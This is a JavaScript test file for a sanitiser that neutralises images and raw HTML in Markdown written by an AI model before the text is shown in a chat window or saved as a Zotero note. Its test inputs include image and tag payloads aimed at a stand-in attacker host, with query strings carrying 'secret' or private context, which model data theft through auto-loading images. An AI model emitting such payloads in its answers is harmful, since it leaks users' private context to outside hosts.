// A model's Markdown, made safe before it is shown (the chat window, lib/Views.js) or saved as a
// Zotero note (the runner, daemon/lib/safe-markdown.mjs): nothing in it loads by itself.
const test = require("node:test");
const assert = require("node:assert/strict");
const V = require("../lib/Views.js");

const CASES = [
  ["an image becomes a link", "See ![chart](https://evil.example/x.png?q=secret).", "See \\![chart](https://evil.example/x.png?q=secret)."],
  ["a reference image too", "![a][r]\n\n[r]: https://evil.example/y.png", "\\![a][r]\n\n[r]: https://evil.example/y.png"],
  ["raw HTML shows as text", 'Hi <img src="https://evil.example/z.png"> and <a href="x">x</a>', 'Hi &lt;img src="https://evil.example/z.png"> and &lt;a href="x">x&lt;/a>'],
  ["comments and declarations too", "<!-- x --> <?php ?>", "&lt;!-- x --> &lt;?php ?>"],
  ["a < that isn't a tag stays", "a < b and 3<4", "a < b and 3<4"],
  ["links are left alone", "[the paper](https://doi.org/10.1/x)", "[the paper](https://doi.org/10.1/x)"],
  ["inline code is left as written", "use `![x](y)` and `<img>` here, then ![z](w)", "use `![x](y)` and `<img>` here, then \\![z](w)"],
  ["fenced code is left as written", "```html\n<img src=\"a\">\n![b](c)\n```\n![d](e)", "```html\n<img src=\"a\">\n![b](c)\n```\n\\![d](e)"],
  ["an unclosed fence (streaming) keeps the rest as code", "```\n<img src=a>", "```\n<img src=a>"],
  // an already escaped "!" stays as it is; a literal backslash before an image doesn't let it through
  ["an escaped ! stays escaped", "\\![a](u)", "\\![a](u)"],
  ["a literal backslash, then an image", "\\\\![a](u)", "\\\\\\![a](u)"],
  ["three backslashes: escaped", "\\\\\\![a](u)", "\\\\\\![a](u)"],
];

test("safeMarkdown (chat window): images become links, raw HTML text, code untouched", () => {
  for (const [what, input, want] of CASES) assert.equal(V.safeMarkdown(input), want, what);
});

test("safeMarkdown (runner): the same rules", async () => {
  const { safeMarkdown } = await import("../daemon/lib/safe-markdown.mjs");
  for (const [what, input, want] of CASES) assert.equal(safeMarkdown(input), want, what);
});

test("a note the runner writes has no <img> and no raw tag from the model", async () => {
  const { safeMarkdown } = await import("../daemon/lib/safe-markdown.mjs");
  const { marked } = await import("../daemon/node_modules/marked/lib/marked.esm.js");
  const answer = 'Findings ![c](https://evil.example/c.png?d=1) <img src="https://evil.example/i.png"> <script>x()</script> **bold** [doi](https://doi.org/1)';
  const html = marked.parse(safeMarkdown(answer), { gfm: true });
  assert.doesNotMatch(html, /<img|<script/i);
  assert.match(html, /<a href="https:\/\/evil\.example\/c\.png\?d=1">c<\/a>/); // only a link: opens when clicked
  assert.match(html, /<strong>bold<\/strong>/);
  assert.match(html, /<a href="https:\/\/doi\.org\/1">doi<\/a>/);
});

test("no way back to an image: every variant, through a Markdown renderer, has no <img> (both implementations)", async () => {
  const { safeMarkdown } = await import("../daemon/lib/safe-markdown.mjs");
  const { marked } = await import("../daemon/node_modules/marked/lib/marked.esm.js");
  const url = "https://example.invalid/pixel?q=private-context";
  const shapes = [`![a](${url})`, `![a][r]\n\n[r]: ${url}`, `![a]\n\n[a]: ${url}`, `![[a]](${url})`, `![a](<${url}>)`,
    `[![a](${url})](https://x.example)`, `<img src="${url}">`, `<IMG SRC=${url}>`, `<p><img src=${url}></p>`];
  const prefixes = ["", "x ", "`code` ", "*", "> ", "- ", "1. ", "**b** "];
  for (const shape of shapes) {
    for (const prefix of prefixes) {
      for (let n = 0; n <= 5; n++) {
        const input = prefix + "\\".repeat(n) + shape;
        for (const [name, fn] of [["chat window", V.safeMarkdown], ["runner", safeMarkdown]]) {
          const html = marked.parse(fn(input), { gfm: true });
          assert.doesNotMatch(html, /<img/i, `${name}: ${JSON.stringify(input)} → ${html}`);
        }
      }
    }
  }
});

